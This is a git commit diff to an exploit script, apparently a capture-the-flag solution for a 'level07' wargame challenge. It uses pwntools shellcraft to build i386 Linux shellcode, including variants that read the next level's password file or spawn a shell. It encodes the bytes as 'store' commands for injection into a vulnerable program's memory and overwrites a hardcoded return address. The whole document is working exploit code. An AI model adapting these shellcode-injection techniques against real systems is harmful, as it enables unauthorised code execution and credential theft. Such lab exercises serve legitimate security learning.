eb50c4248185eb246ab55f5b9c0485cd57789c69
Sawyerf <sawyer.flink@protonmail.ch>
2021-10-21 17:32:10 +0200

    Up: level07

--- level07/shellcode.py
+++ level07/shellcode.py
@@ -1,7 +1,9 @@
 import pwn
 import re
+import struct
 
-shell = pwn.shellcraft.i386.linux.cat('/home/users/level08/.pass')
+# shell = pwn.shellcraft.i386.linux.cat('/home/users/level08/.pass')
+shell = pwn.shellcraft.i386.linux.echo('lol')
 # shell = pwn.shellcraft.i386.linux.cat('test')
 # shell = pwn.shellcraft.i386.linux.sh()
 shell = shell.split('\n')
@@ -18,6 +20,9 @@ for line in shell:
 		# print(add.hex())
 		hexasm = re.findall('(.{8})', add.hex())
 		for hexa in hexasm:
+			hexa = re.findall('(.{2})', hexa)
+			hexa.reverse()
+			hexa = ''.join(hexa)
 			print('store')
 			print(int(hexa, 16))
 			print(index)
@@ -41,7 +46,10 @@ if size != 0:
 		index += 1
 		if index % 3 == 0:
 			index += 1
-print('store')
-print(0xffffd478)
-print(-1040108826)
+# print('store')
+# print(0xffffd458)
+# print(-1040108826)
 # print(pwn.disasm(tt))
+print('store')
+print('4294956120')
+print('-1040108819')
